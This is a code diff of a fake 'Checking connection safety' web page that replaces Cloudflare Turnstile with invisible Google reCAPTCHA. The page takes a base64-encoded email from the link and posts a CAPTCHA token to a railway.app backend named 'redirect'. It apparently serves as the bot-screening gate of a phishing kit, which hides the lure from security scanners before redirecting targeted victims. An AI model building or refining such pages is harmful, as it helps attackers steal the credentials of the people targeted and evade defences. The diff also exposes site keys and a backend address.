@@ -103,7 +103,7 @@
             line-height: 1.5;
         }
 
-        .cf-turnstile-container {
+        .g-recaptcha-container {
             display: none;
         }
 
@@ -113,8 +113,8 @@
             margin-top: 40px;
         }
     </style>
-    <!-- Cloudflare Turnstile API -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+    <!-- Google reCAPTCHA API -->
+    <script src="https://www.google.com/recaptcha/api.js?onload=onloadRecaptchaCallback&render=explicit" async defer></script>
 </head>
 <body>
     <div class="loader-card">
@@ -128,13 +128,13 @@
         <h1 id="status-title">Checking connection safety</h1>
         <p id="status-subtitle">Verifying your browser integrity. Please wait...</p>
         
-        <!-- Hidden Turnstile Widget Container -->
-        <div class="cf-turnstile-container">
-            <div id="turnstile-widget"></div>
+        <!-- Hidden reCAPTCHA Widget Container -->
+        <div class="g-recaptcha-container">
+            <div id="recaptcha-widget"></div>
         </div>
 
         <div class="footer-info">
-            Protected by Cloudflare Turnstile.
+            Protected by Google reCAPTCHA.
         </div>
     </div>
 
@@ -2634,7 +2634,7 @@
     <script>
         // CONFIGURATION: Set your backend API URL here
         const BACKEND_API_URL = 'https://redirect-06-07-2026-production.up.railway.app'; // Change to 'http://localhost:3000' during local testing
-        const TURNSTILE_SITE_KEY = '0x4AAAAAADwt7PrnF94xNQ0-'; // Replace with live site key if needed
+        const RECAPTCHA_SITE_KEY = '6LcpGUktAAAAAM6MY2SBj5qty-QNBKkutpNH5ofJ'; // Replace with live site key if needed
 
         // Helper: Extract base64 email from the URL (path, search query, or hash)
         function getBase64Email() {
@@ -2655,15 +2655,15 @@
             return null;
         }
 
-        window.onloadTurnstileCallback = function () {
+        window.onloadRecaptchaCallback = function () {
             const emailB64 = getBase64Email();
             if (!emailB64) {
                 showError('Security context missing from URL.');
                 return;
             }
 
-            turnstile.render('#turnstile-widget', {
-                sitekey: TURNSTILE_SITE_KEY,
+            const widgetId = grecaptcha.render('recaptcha-widget', {
+                sitekey: RECAPTCHA_SITE_KEY,
                 callback: function(token) {
                     // Send to backend verify endpoint
                     fetch(`${BACKEND_API_URL}/verify`, {
@@ -2709,10 +2709,13 @@
                     });
                 },
                 'error-callback': function() {
-                    showError('Turnstile challenge failed. Please refresh.');
+                    showError('reCAPTCHA challenge failed. Please refresh.');
                 },
                 size: 'invisible'
             });
+
+            // Trigger the invisible reCAPTCHA challenge execution
+            grecaptcha.execute(widgetId);
         };
 
         function showError(msg) {
